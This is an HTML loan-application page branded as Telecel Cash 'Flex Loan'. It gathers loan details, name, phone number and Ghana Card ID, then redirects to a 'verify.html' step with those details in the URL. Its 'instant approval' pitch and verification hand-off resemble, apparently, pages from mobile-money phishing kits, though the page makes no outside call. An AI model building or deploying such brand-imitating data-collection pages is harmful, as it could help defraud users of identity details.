<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apply for Flex Loan - Telecel Cash</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root {
            --telecel-red: #E42320;
            --telecel-red-hover: #c41e1b;
            --dark: #1a1a1a;
            --text-gray: #4a5568;
            --glass-bg: rgba(255, 255, 255, 0.85);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body {
            background: linear-gradient(135deg, #f8f9fa, #f0f4f8);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }
        .orb { position: fixed; border-radius: 50%; filter: blur(90px); z-index: -1; opacity: 0.25; }
        .orb-1 { width: 450px; height: 450px; background: var(--telecel-red); top: -15%; left: -10%; }
        .orb-2 { width: 380px; height: 380px; background: #ff6b5e; bottom: -10%; right: -10%; }

        .form-container {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.9);
            box-shadow: 0 20px 60px rgba(228, 35, 32, 0.15);
            max-width: 520px;
            width: 100%;
            border-radius: 28px;
            padding: 40px 35px;
        }
        .form-container::before {
            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: var(--telecel-red);
        }
        .form-header { text-align: center; margin-bottom: 35px; }
        .form-header h2 { font-size: 28px; font-weight: 800; color: var(--dark); }
        .progress-bar { display: flex; justify-content: center; gap: 10px; margin: 25px 0 35px; }
        .progress-segment {
            height: 6px; width: 80px; background: #e5e7eb; border-radius: 10px;
        }
        .progress-segment.active { background: var(--telecel-red); }

        .form-step { display: none; }
        .form-step.active { display: block; }

        .form-group { margin-bottom: 24px; }
        label { display: block; font-weight: 600; color: var(--text-gray); margin-bottom: 8px; }
        .form-control {
            width: 100%; padding: 14px 16px; border: 2px solid #e5e7eb;
            border-radius: 14px; font-size: 16px;
        }
        .form-control:focus { border-color: var(--telecel-red); outline: none; }

        .button-group { display: flex; gap: 12px; margin-top: 30px; }
        .btn {
            flex: 1; padding: 16px; border-radius: 14px; font-weight: 700;
            cursor: pointer; border: none; font-size: 16px;
        }
        .btn-primary { background: var(--telecel-red); color: white; }
        .btn-secondary { background: #f3f4f6; color: #4b5563; }
    </style>
</head>
<body>
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>

    <div class="form-container">
        <div class="form-header">
            <h2>Apply for Flex Loan</h2>
            <p>Instant approval • Funds in minutes</p>
            <div class="progress-bar">
                <div class="progress-segment active" id="prog-1"></div>
                <div class="progress-segment" id="prog-2"></div>
                <div class="progress-segment" id="prog-3"></div>
            </div>
        </div>

        <form id="loanForm">
            <!-- Step 1 -->
            <div class="form-step active" id="step-1">
                <div class="form-group">
                    <label>Loan Amount (GHS)</label>
                    <input type="number" class="form-control" id="loanAmount" placeholder="2500" min="500" max="25000" required>
                </div>
                <div class="form-group">
                    <label>Loan Duration (Period)</label>
                    <select class="form-control" id="duration" required>
                        <option value="">Select Duration</option>
                        <option value="7">7 Days</option>
                        <option value="14">14 Days</option>
                        <option value="30">30 Days</option>
                        <option value="60">60 Days</option>
                        <option value="90">90 Days</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Loan Purpose</label>
                    <select class="form-control" id="purpose" required>
                        <option value="">Select Purpose</option>
                        <option value="Business">Business / Trading</option>
                        <option value="Emergency">Emergency Needs</option>
                        <option value="Medical">Medical Bills</option>
                        <option value="Education">School Fees</option>
                        <option value="Personal">Personal Use</option>
                        <option value="Other">Other</option>
                    </select>
                </div>
                <div class="button-group">
                    <button type="button" class="btn btn-primary" onclick="nextStep(1)">Continue <i class="fa-solid fa-arrow-right"></i></button>
                </div>
            </div>

            <!-- Step 2 -->
            <div class="form-step" id="step-2">
                <div class="form-group">
                    <label>Full Name</label>
                    <input type="text" class="form-control" id="fullName" placeholder="Kwame Mensah" required>
                </div>
                <div class="form-group">
                    <label>Telecel Number</label>
                    <input type="tel" class="form-control" id="phone" placeholder="0501234567" required>
                </div>
                <div class="form-group">
                    <label>Ghana Card ID</label>
                    <input type="text" class="form-control" id="idNumber" placeholder="GHA-XXXXXXXXX" required>
                </div>
                <div class="button-group">
                    <button type="button" class="btn btn-secondary" onclick="prevStep(2)">Back</button>
                    <button type="button" class="btn btn-primary" onclick="nextStep(2)">Review Application</button>
                </div>
            </div>

            <!-- Step 3 -->
            <div class="form-step" id="step-3">
                <h4 style="color:var(--telecel-red); margin-bottom:15px;">Application Summary</h4>
                <div style="background:#fff; padding:18px; border-radius:12px; border:1px solid #fee2e2;">
                    <p><strong>Amount:</strong> <span id="sum-amount">-</span></p>
                    <p><strong>Duration:</strong> <span id="sum-duration">-</span></p>
                    <p><strong>Purpose:</strong> <span id="sum-purpose">-</span></p>
                    <p><strong>Name:</strong> <span id="sum-name">-</span></p>
                    <p><strong>Phone:</strong> <span id="sum-phone">-</span></p>
                </div>
                <div class="button-group">
                    <button type="button" class="btn btn-secondary" onclick="prevStep(3)">Back</button>
                    <button type="button" class="btn btn-primary" id="submitBtn" onclick="submitApplication()">
                        Proceed to Verification →
                    </button>
                </div>
            </div>
        </form>
    </div>

    <script>
        function nextStep(current) {
            if (current === 2) populateSummary();
            document.getElementById(`step-${current}`).classList.remove('active');
            document.getElementById(`step-${current+1}`).classList.add('active');
            document.getElementById(`prog-${current+1}`).classList.add('active');
        }

        function prevStep(current) {
            document.getElementById(`step-${current}`).classList.remove('active');
            document.getElementById(`step-${current-1}`).classList.add('active');
            document.getElementById(`prog-${current}`).classList.remove('active');
        }

        function populateSummary() {
            const amount = document.getElementById('loanAmount').value;
            const duration = document.getElementById('duration').value;
            const purposeText = document.getElementById('purpose').options[document.getElementById('purpose').selectedIndex].text;

            document.getElementById('sum-amount').textContent = amount ? `GHS ${parseFloat(amount).toLocaleString()}` : '-';
            document.getElementById('sum-duration').textContent = duration ? `${duration} Days` : '-';
            document.getElementById('sum-purpose').textContent = purposeText || '-';
            document.getElementById('sum-name').textContent = document.getElementById('fullName').value || '-';
            document.getElementById('sum-phone').textContent = document.getElementById('phone').value || '-';
        }

        function submitApplication() {
            const btn = document.getElementById('submitBtn');
            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
            btn.disabled = true;

            const amount = document.getElementById('loanAmount').value;
            const duration = document.getElementById('duration').value;
            const purpose = document.getElementById('purpose').value;
            const name = document.getElementById('fullName').value;
            const phone = document.getElementById('phone').value;

            const params = new URLSearchParams({
                amount: amount,
                duration: duration,
                purpose: purpose,
                name: name,
                phone: phone
            });

            setTimeout(() => {
                window.location.href = `verify.html?${params.toString()}`;
            }, 1200);
        }

        // Auto-fill from URL parameters (from main page)
        window.onload = () => {
            const urlParams = new URLSearchParams(window.location.search);
            
            if (urlParams.get('amount')) {
                document.getElementById('loanAmount').value = urlParams.get('amount');
            }
            if (urlParams.get('duration')) {
                document.getElementById('duration').value = urlParams.get('duration');
            }
            if (urlParams.get('purpose')) {
                document.getElementById('purpose').value = urlParams.get('purpose');
            }
        };
    </script>
</body>
</html>
